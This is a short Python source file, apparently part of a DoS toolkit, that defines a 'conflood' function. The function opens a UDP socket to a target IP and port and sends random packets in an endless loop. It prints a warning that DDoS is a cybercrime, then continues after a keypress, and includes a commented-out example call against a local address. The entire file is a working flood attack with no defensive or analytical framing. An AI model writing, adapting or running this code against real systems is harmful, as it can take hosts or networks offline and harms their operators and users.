import os
import socket
import time
import random
from src.design.colors import WHITE, GREEN, YELLOW, PURPLE 

def conflood(ip, port, sleep):
    print(f"{YELLOW}[LOCK] {WHITE}Locking Socket on {ip}:{port}")
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM) # works with almost every type of port
    s.connect((ip, port))
    time.sleep(2)
    print(f"{GREEN}[LOCKED]{WHITE} Locked on {ip}:{port}. Koalas have joined the network")
    print(f"{PURPLE}[AGREE]{WHITE} DDoSing/DoSing is a cybercrime and can land you in federal prison, If you still want to continue press any key")
    input()
    i = 0
    while True:
        packet = random._urandom(10)
        s.send(packet)
        time.sleep(sleep)
        print(f"{PURPLE}[+]{WHITE} Packets sent: {i}, Packet Content: {packet}", end="\r")
        i = i+1

# conflood("192.168.1.1", 444, 0.01)